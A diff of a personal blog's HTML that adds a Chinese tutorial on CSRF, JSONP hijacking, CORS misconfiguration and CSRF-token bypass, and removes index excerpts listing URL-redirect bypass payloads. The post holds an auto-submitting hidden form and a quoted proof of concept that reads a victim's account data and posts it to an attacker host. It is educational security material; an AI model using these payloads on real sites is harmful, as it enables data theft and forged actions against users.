@@ -203,12 +203,23 @@
 </head>
 
     
+        <body class="post-body">
+    
     
 <header class="header">
 
     <div class="read-progress"></div>
     <div class="header-sidebar-menu">&#xe775;</div>
     <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/">H0e4a0r1t&#39;s Blog</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name"></a>
+            </div>
+    </div>
     
     <a class="home-link" href="/">H0e4a0r1t's Blog</a>
 </header>
@@ -220,24 +231,68 @@
 
 
 
+
+height:50vh;
 ">
     
     <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
             
     <div class="site-intro-placeholder"></div>
-    <div class="site-intro-img" style="background-image: url(/)"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/post-bg.jpg)"></div>
     <div class="site-intro-meta">
         <!-- 标题  -->
         <h1 class="intro-title">
             <!-- 主页  -->
+            
+            [Untitled Post]
+            <!-- 404 -->
             
         </h1>
         <!-- 副标题 -->
         <p class="intro-subtitle">
             <!-- 主页副标题  -->
             
+            
+            <!-- 404 -->
+            
         </p>
         <!-- 文章页meta -->
+        
+            <div class="post-intros">
+                <!-- 文章页标签  -->
+                
+                
+                    <div class="post-intro-read">
+                        <span>字数统计: <span class="post-count word-count">841</span>阅读时长: <span class="post-count reading-time">3 min</span></span>
+                    </div>
+                
+                <div class="post-intro-meta">
+                    <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                    <span class="post-intro-time">2019/05/04</span>
+                    
+                    <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                        <span class="iconfont-archer">&#xe602;</span>
+                        <span id="busuanzi_value_page_pv"></span>
+                    </span>
+                    
+                    <span class="shareWrapper">
+                        <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                        <span class="shareText">Share</span>
+                        <ul class="shareList">
+                            <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                                <div class="share-qrcode"></div>
+                            </li>
+                            <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                            <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                            <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                            <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                        </ul>
+                    </span>
+                </div>
+            </div>
         
     </div>
 </div>
@@ -338,105 +393,88 @@
 </script>        
         <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
         <div class="container container-unloaded">
-            <main class="main index-page">
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/05/07/url跳转/">
-            
-                <span>[Untitled Post]</span>
-        </a>
-        <div class="abstract-content">
-            title:URL跳转
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h1><h2 id="0x00-什么是CSRF？"><a href="#0x00-什么是CSRF？" class="headerlink" title="0x00.什么是CSRF？"></a>0x00.什么是CSRF？</h2><p>通俗简单点理解就是本该是你本人操作的步骤，攻击者已经给你模拟好了，而只差被系统误认为是你本人在操作，所以只需要你的好奇心驱使你点一下恶意链接，本质上就是你做的操作，只不过操作的value已经被攻击者设置好了，你只是负责触发，即只差你这个身份凭证了。</p>
+<h2 id="0x01-CSRF简单演示"><a href="#0x01-CSRF简单演示" class="headerlink" title="0x01.CSRF简单演示"></a>0x01.CSRF简单演示</h2><p>这里就拿DVWA来做演示</p>
+<p>正常用户修改密码操作，这里并未做任何用户凭证的校验</p>
+<p><img src="https://i.loli.net/2019/05/04/5ccd946d5eb7b.png" alt></p>
+<p>抓包，可以看到，模拟用户修改密码为123456并提交</p>
+<p><img src="https://i.loli.net/2019/05/04/5ccd946ccd03e.png" alt></p>
+<p>BurpSuite自带有构造CSRF的poc的工具</p>
+<p><img src="https://i.loli.net/2019/05/04/5ccd946d8ee72.png" alt></p>
+<p><img src="https://i.loli.net/2019/05/04/5ccd946d9de9d.png" alt></p>
+<p>也可以自己构造</p>
+<p><img src="https://i.loli.net/2019/05/04/5ccd946d7f0a1.png" alt></p>
+<p>CSRF表单自动提交代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;form name=&quot;postxss&quot; method=&quot;post&quot; action=&quot;?前面的url&quot; hidden=&quot;hidden&quot;&gt;</span><br><span class="line">   &lt;input type=&quot;text&quot; name=&quot;&quot;(可从源代码中查看) value=&quot;想要设定的内容&quot; hidden=&quot;hidden&quot; /&gt;</span><br><span class="line">   &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">&lt;/form&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">    document.postxss.submit();</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="0x02-JSONP劫持（读取型CSRF）"><a href="#0x02-JSONP劫持（读取型CSRF）" class="headerlink" title="0x02.JSONP劫持（读取型CSRF）"></a>0x02.JSONP劫持（读取型CSRF）</h2><h3 id="漏洞案例"><a href="#漏洞案例" class="headerlink" title="漏洞案例"></a>漏洞案例</h3><p>这里jsonp做跨域资源共享，通过callback回调函数来获取参数为foo的json格式的数据</p>
+<p><img src="https://i.loli.net/2019/05/04/5ccda1df6680a.png" alt></p>
+<p>构造POC</p>
+<p><img src="https://i.loli.net/2019/05/04/5ccda1df3ba5b.png" alt></p>
+<p>用户点开链接后即被劫持</p>
+<p><img src="https://i.loli.net/2019/05/04/5ccda1df5ed93.png" alt></p>
+<h2 id="0x03-CORS跨域读取"><a href="#0x03-CORS跨域读取" class="headerlink" title="0x03.CORS跨域读取"></a>0x03.CORS跨域读取</h2><p>挖掘思路：添加Ogrin头部信息，看返回的数据里面有没有Access-Control-Allow-Orgin这个参数出现如果有。尝试让他变成任意的url，如果在返回包里的Access-Control-Allow-Orgin这个参数后面的值有你放入的url，就可以进行cors劫持了。（acac支持传递cookie，acao支持跨域读取）</p>
+<h3 id="漏洞案例-1"><a href="#漏洞案例-1" class="headerlink" title="漏洞案例"></a>漏洞案例</h3><p>原打算放自己刚挖到的，后面因为poc传递格式还有些问题没有解决，所以找一篇案例吧</p>
+<p><a href="https://medium.com/@nahoragg/a-simple-cors-misconfig-leaked-private-post-of-twitter-facebook-instagram-5f1a634feb9d" target="_blank" rel="noopener">A Simple CORS Misconfig Leaked Private Post Of Twitter, Facebook &amp; Instagram</a></p>
+<p>在burp history中看到了有一个响应包中有<em>Access-Control-Allow-Origin:<a href="https://niche.co/" target="_blank" rel="noopener">https://niche.co</a> &amp; Access-Control-Allow-Credentials: true</em>,于是尝试通过在请求中发送自定义Origin头来进行利用，并发现服务器只检查“//niche.co”是否在Origin头中。例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Origin: https://evil.co , Access-Control-Allow-Origin: https://niche.co</span><br><span class="line">Origin: https://niche.co.evil.net, Access-Control-Allow-Origin: https://niche.co.evil.net</span><br></pre></td></tr></table></figure>
+<p><img src="https://i.loli.net/2019/05/05/5ccf0615967ec.png" alt></p>
+<p>结合易受攻击的api和站点，我可以使用CORS（图像，电子邮件ID，个人资料信息，CSRF令牌等）窃取有关其他用户的任何信息，所以他做了以下POC：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;button type=&apos;button&apos; onclick=&apos;cors()&apos;&gt;CORS&lt;/button&gt;</span><br><span class="line">&lt;p id=&apos;demo&apos;&gt;&lt;/p&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">function cors() &#123;</span><br><span class="line">var xhttp = new XMLHttpRequest();</span><br><span class="line">xhttp.onreadystatechange = function() &#123;</span><br><span class="line">if (this.readyState == 4 &amp;&amp; this.status == 200) &#123;</span><br><span class="line">var a = this.responseText; // Sensitive data from niche.co about user account</span><br><span class="line">document.getElementById(&quot;demo&quot;).innerHTML = a;</span><br><span class="line">xhttp.open(&quot;POST&quot;, &quot;http://evil.cors.com&quot;, true);// Sending that data to Attacker&apos;s website</span><br><span class="line">xhttp.withCredentials = true;</span><br><span class="line">console.log(a);</span><br><span class="line">xhttp.send(&quot;data=&quot;+a);</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line">xhttp.open(&quot;GET&quot;, &quot;https://www.niche.co/api/v1/users/*******&quot;, true);</span><br><span class="line">xhttp.withCredentials = true;</span><br><span class="line">xhttp.send();</span><br><span class="line">&#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+<h2 id="0x04-CSRF-bypass"><a href="#0x04-CSRF-bypass" class="headerlink" title="0x04.CSRF bypass"></a>0x04.CSRF bypass</h2><ul>
+<li>删除CSRF token / Referer / XRSF Header</li>
+<li>置空token参数</li>
+<li>修改请求方法  POST修改为GET</li>
+<li>与token相同长度的任意字符串替换token</li>
+<li>固定token   即攻击者的token放在被攻击者的请求中也可以使用</li>
+<li>组合利用  可利用xss获取csrf token</li>
+</ul>
 
-1.变形绕过@绕过：url=目标地址@www.baidu.com
-问号绕过：url=https://目标地址/?baidu.com
-锚链接绕过：url=http://baidu.com/#目标地址
-xip.io绕过：url=http://目标地址.www.baidu.com.xip.io/
-反斜杠绕过：url=https:/\www.baidu.com
-IP绕过：把目标的URL修改成IP地址，这样也有可能绕过waf的拦截
-编码绕过：
-12
-chrome浏览器特性：
-12
-2.利用url跳转漏洞12
-3.字典（WFuzz）123456789101112131415...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/05/07</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
     </article>
+    <!-- license  -->
     
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/05/05/wfuzz/">
-            
-                <span>WFUZZ</span>
-        </a>
-        <div class="abstract-content">
-            WFUZZ（爆破谁就FUZZ谁）wfuzz占位符      https://www.baidu.com/FUZZ使用字典：  wfuzz -w 字典路径(绝对路径) URL/FUZZ                   wfuzz -w 目录字典路径 -w 文件名字典路径 -w 后缀名字典路径 URL/FUZZ/FUZ2Z.FUZ3Z
-隐藏响应结果：1.–hc 根据响应报文状态码进行隐藏（hide code）2.–hl根据响应报文行数进行隐藏（hide lines)3.–hw根据响应报文字数进行隐藏（hide word）4.–hh根据响应报文字符数进行隐藏（hide chars 这里因为...
+        <div class="license-wrapper">
+            <p>原文作者：<a href="http://yoursite.com">H1e4a0r1t</a>
+            </p><p>原文链接：<a href="http://yoursite.com/2019/05/04/csrf/">http://yoursite.com/2019/05/04/csrf/</a>
+            </p><p>发表日期：<a href="http://yoursite.com/2019/05/04/csrf/">May 4th 2019, 5:42:53 pm</a>
+            </p><p>更新日期：<a href="http://yoursite.com/2019/05/04/csrf/">May 6th 2019, 2:49:09 pm</a>
+            </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/05/05</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/05/04/csrf/">
-            
-                <span>[Untitled Post]</span>
-        </a>
-        <div class="abstract-content">
-            CSRF0x00.什么是CSRF？通俗简单点理解就是本该是你本人操作的步骤，攻击者已经给你模拟好了，而只差被系统误认为是你本人在操作，所以只需要你的好奇心驱使你点一下恶意链接，本质上就是你做的操作，只不过操作的value已经被攻击者设置好了，你只是负责触发，即只差你这个身份凭证了。
-0x01.CSRF简单演示这里就拿DVWA来做演示
-正常用户修改密码操作，这里并未做任何用户凭证的校验
-
-抓包，可以看到，模拟用户修改密码为123456并提交
-
-BurpSuite自带有构造CSRF的poc的工具
-
-
-也可以自己构造
-
-CSRF表单自动提交代码
-1234567&lt;form name=&qu...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/05/04</span>
-            </div>
-            <!-- tags  -->
-            
-        </div>
-    </article>
     
     <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/2019/05/05/wfuzz/" title="WFUZZ">
+                    <div class="nextTitle">WFUZZ</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2019/04/24/2019-4-23随记/" title="2019/4/23 随记">
+                    <div class="prevTitle">2019/4/23 随记</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
     
+    
+    <!-- partial('_partial/comment/changyan') -->
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
 </main>
             <!-- profile -->
             
@@ -521,6 +559,24 @@ CSRF表单自动提交代码
 </footer>
     </div>
     <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#CSRF"><span class="toc-number">1.</span> <span class="toc-text">CSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-什么是CSRF？"><span class="toc-number">1.1.</span> <span class="toc-text">0x00.什么是CSRF？</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-CSRF简单演示"><span class="toc-number">1.2.</span> <span class="toc-text">0x01.CSRF简单演示</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-JSONP劫持（读取型CSRF）"><span class="toc-number">1.3.</span> <span class="toc-text">0x02.JSONP劫持（读取型CSRF）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞案例"><span class="toc-number">1.3.1.</span> <span class="toc-text">漏洞案例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-CORS跨域读取"><span class="toc-number">1.4.</span> <span class="toc-text">0x03.CORS跨域读取</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞案例-1"><span class="toc-number">1.4.1.</span> <span class="toc-text">漏洞案例</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-CSRF-bypass"><span class="toc-number">1.5.</span> <span class="toc-text">0x04.CSRF bypass</span></a></li></ol></li></ol>
+    </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
     <div class="sidebar sidebar-hide">
@@ -814,6 +870,8 @@ jsonContent:
     
     </div>
     <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
      
     </body>
 </html>
